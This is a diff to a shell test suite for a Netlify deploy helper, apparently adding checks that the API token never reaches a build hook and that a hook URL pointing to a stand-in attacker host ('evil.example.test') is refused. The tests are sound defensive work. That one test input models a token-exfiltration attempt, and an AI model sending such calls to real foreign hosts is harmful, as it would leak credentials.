@@ -27,9 +27,9 @@ m=GET; prev=""; data=""; for a in "$@"; do
 url="${*: -1}"
 conf="$(cat)"
 echo "curl $m $url ARGS[$*] DATA[$data]" >> "$CALLS"
-# The API gets the token on stdin; a build hook never does (it is a URL of its own).
+# The API needs the token; a build hook must never get it (the hook URL is the only secret there).
 case "$url" in
-  https://api.netlify.com/build_hooks/*) case "$conf" in *Authorization*) echo "token sent to a build hook" >&2; exit 2 ;; esac ;;
+  https://api.netlify.com/build_hooks/*) case "$conf" in *Authorization*) echo "TOKEN-TO-HOOK $url" >> "$CALLS"; exit 2 ;; esac ;;
   *) case "$conf" in *"Authorization: Bearer "*) ;; *) echo "no token on stdin" >&2; exit 2 ;; esac ;;
 esac
 if [ -n "${FAKE_STATUS:-}" ]; then printf '%s\n%s' "$(cat "$FIX/error-$FAKE_STATUS.json")" "$FAKE_STATUS"; exit 0; fi
@@ -218,6 +218,11 @@ out="$(netlify_deploy_json shop 2>&1)"; rc=$?
 expect "deploy shop: exit 0" "$rc" 0
 expect "deploy shop: the new deploy" "$(echo "$out" | jq -c '[.id, .phase, .url]')" '["d-shop-new","queued","https://d-shop-new--shop.netlify.app"]'
 expect "deploy shop: one hook call" "$(calls 'curl POST https://api.netlify.com/build_hooks/hook-shop')" 1
+expect "deploy shop: the hook got no token (IDEEN-6 335)" "$(calls 'TOKEN-TO-HOOK')" 0
+# A hook URL changed to another host in netlify-hooks.json: nothing is posted, no token leaves.
+reset
+expect "a foreign hook URL is refused (IDEEN-6 335)" \
+  "$( (netlify_call POST https://evil.example.test/build_hooks/x '{}' >/dev/null 2>&1; echo $?); calls 'curl POST https://evil')" $'1\n0'
 out="$(netlify_deploy_json shop --sha abc123 2>&1)"; rc=$?
 expect "deploy --sha: refused" "$rc" 1
 has "deploy --sha: says why" "$out" "Netlify cannot deploy a given commit"
